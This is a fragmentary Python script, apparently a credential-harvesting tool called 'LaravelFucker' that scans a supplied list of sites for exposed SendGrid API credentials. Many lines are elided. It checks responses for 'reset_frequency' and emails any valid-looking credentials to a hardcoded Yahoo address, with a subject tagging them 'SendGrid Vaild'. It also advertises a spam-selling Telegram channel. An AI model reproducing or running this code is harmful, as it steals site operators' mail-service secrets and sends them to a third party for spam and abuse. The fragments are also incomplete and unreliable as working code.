...
print(f'''
  ...
  / ___/___  ____  ____/ /__{gr}Zae3m{red}__(_)___/ /  /   |  ____  (_)  / ____/ /_  ___  _____/ /_____  _____ {red}
...
/____/\___/_/ /_/\__,_/\__, /_/  /_/\__,_/  /_/  |_/ .___/_/   \____/_/ /_/\___/\___/_/|_|\___/_/     {yl}
                      /____/                      /_/                              {gr}{wh} LaravelFucker {red}V1{res}                  
''')

link = input(f'{gr}Give Me Your List.txt{res}\{red}Zae3m> {gr}${res} ')
address = input(f'{gr}Give Me Your Adress{res}\{red}Zae3m> {gr}${res} ')
    ...
    for star in fp:
        ...
        try:
            ...
            if 'reset_frequency' in x:
                ...
                print(f'--------------LaravelFucker {red}V2 {ble}Sendgrid Api{res} Checker------------\n')
                ...
                addr2 = "toomaa_89@yahoo.com"
                msg = "From: %s\r\nTo: %s\r\nSubject: !Zae3m SendGrid Vaild %s|%s|%s|%s\r\n\r\nMessage From LaravelFucker - https://t.me/spam_dollarers %s" % (
